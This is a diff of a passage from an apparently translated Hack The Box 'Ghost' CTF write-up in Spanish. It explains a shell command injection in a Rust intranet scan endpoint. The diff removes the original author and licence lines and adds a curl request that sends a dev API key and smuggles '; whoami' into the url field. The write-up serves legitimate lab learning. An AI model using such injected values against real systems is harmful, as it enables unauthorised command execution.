@@ -404,10 +404,11 @@ pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
 > El comando está construido con format!("intranet_url_check {}", data.url), que incorpora directamente el url parámetro en el comando de shell sin desinfección.
 ```
 
-# For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.  
-# Licens: CC BY-NC-SA 4.0  
-# Author: Axura  
-# URL: https://4xura.com/ctf/htb/htb-writeup-ghost/  
-# Source: Axura's Blog  
-  
-Por lo tanto, si el urlEl parámetro contiene metacaracteres de shell, puede inyectar comandos arbitrarios. Podemos probar la vulnerabilidad enviando una solicitud POST al punto final mencionado en el archivo Léame:
+Por lo tanto, si el urlEl parámetro contiene metacaracteres de shell, puede inyectar comandos arbitrarios. Podemos probar la vulnerabilidad enviando una solicitud POST al punto final mencionado en el archivo Readme:
+
+```python
+curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"https://4xura.com; whoami"}' | jq
+```
+
+![[Pasted image 20240718203301.png]]
+
